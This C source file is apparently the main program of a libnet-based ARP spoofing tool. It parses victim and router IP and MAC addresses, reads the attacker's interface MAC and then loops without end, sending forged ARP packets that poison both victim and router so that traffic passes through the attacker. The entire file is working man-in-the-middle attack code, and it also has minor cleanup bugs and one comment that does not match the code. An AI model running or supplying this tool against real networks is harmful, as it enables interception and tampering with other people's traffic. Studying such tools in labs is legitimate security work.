#include "arpSpoof.h"

// ---------
// Initialize the global pointers to NULL. 
// This is a safety measure to ensure they do not point to random memory 
// before 'malloc' and to allow explicit checking (if (l == NULL)) for initialization failures.
// ---------

libnet_t *l = NULL; 
device *victim = NULL;
device *router = NULL;
uint8_t *attacker_mac_addr = NULL;


// ---------
// MAIN
// ---------

int main(int argc, char *argv[]) {
    char errbuf[LIBNET_ERRBUF_SIZE];

    // Allocate memory for the global device structures (Victim and Router)
    victim = (device *)malloc(sizeof(device));
    router = (device *)malloc(sizeof(device));

    // Check if the required number of arguments (5 + program name) is provided
    if (argc != 6) {
        fprintf(stderr, "Use: %s <Victim_IP> <Victim_MAC> <Router_IP> <Router_MAC> <Web_Interface>\n", argv[0]);
        free(victim);
        free(router);
        return 1;
    }

    // Get the network interface name and initialize Libnet context for link-layer packet injection
    char *iface_name = argv[5];
    l = libnet_init(LIBNET_LINK, iface_name, errbuf);
    if (l == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        free(victim);
        free(router);
        libnet_destroy(l);
        return 1;   
    }


    // --- VICTIM DEVICE SETUP ---
    victim->readable_ip = argv[1];
    // Convert IP string to network byte order (uint32_t)
    victim->ip_addr = libnet_name2addr4(l, victim->readable_ip, LIBNET_DONT_RESOLVE);
    // Convert MAC string (argv[4]) to binary 6-byte array
    parse_mac(argv[2], victim->mac_addr);


    // --- ROUTER DEVICE SETUP ---
    router->readable_ip = argv[3];
    router->ip_addr = libnet_name2addr4(l, router->readable_ip, LIBNET_DONT_RESOLVE);
    parse_mac(argv[4], router->mac_addr);


    // --- ATTACKER MAC SETUP ---
    // Get the attacker's MAC address from the interface
    struct libnet_ether_addr *mac_ptr = libnet_get_hwaddr(l);
    if (mac_ptr == NULL) {
        fprintf(stderr, "Could not determine attacker's MAC address (libnet_get_hwaddr failed).\n");
        free(victim);
        free(router);
        libnet_destroy(l);
        return 1;
    }

    // Memory allocation for attacker's MAC address global variable
    attacker_mac_addr = (uint8_t *)malloc(HARDWARE_ADDR_SIZE); 
    if (attacker_mac_addr == NULL) {
        perror("malloc");
        free(victim);
        free(router);
        free(attacker_mac_addr);
        libnet_destroy(l);
        return 1;
    }

    // Copy the attacker's MAC address into the global variable
    memcpy(attacker_mac_addr, mac_ptr->ether_addr_octet, HARDWARE_ADDR_SIZE);

    // Set up the signal handler for Ctrl+C (SIGINT) cleanup
    if (signal(SIGINT, cleanup_and_exit) == SIG_ERR) {
        fprintf(stderr, "Can't catch SIGINT: %s\n", strerror(errno));
        free(victim);
        free(router);
        free(attacker_mac_addr);
        libnet_destroy(l);
        return 1;
    }

    fprintf(stdout, "Attacker MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
            attacker_mac_addr[0], attacker_mac_addr[1], attacker_mac_addr[2],
            attacker_mac_addr[3], attacker_mac_addr[4], attacker_mac_addr[5]);
    fprintf(stdout, "Sending spoofed ARP packets. Press CTRL+C to restore tables.\n");


    // Main loop for continuous ARP poisoning
    while (1) {
        // Tell the Victim that the Router is HERE (at Attacker's MAC)
        arp_spoof(router, victim, iface_name);

        // Tell the Router that the Victim is HERE (at Attacker's MAC)
        arp_spoof(victim, router, iface_name);

        sleep(2);
    }

    free(victim);
    free(router);
    free(attacker_mac_addr);
    libnet_destroy(l);
    return 0;
}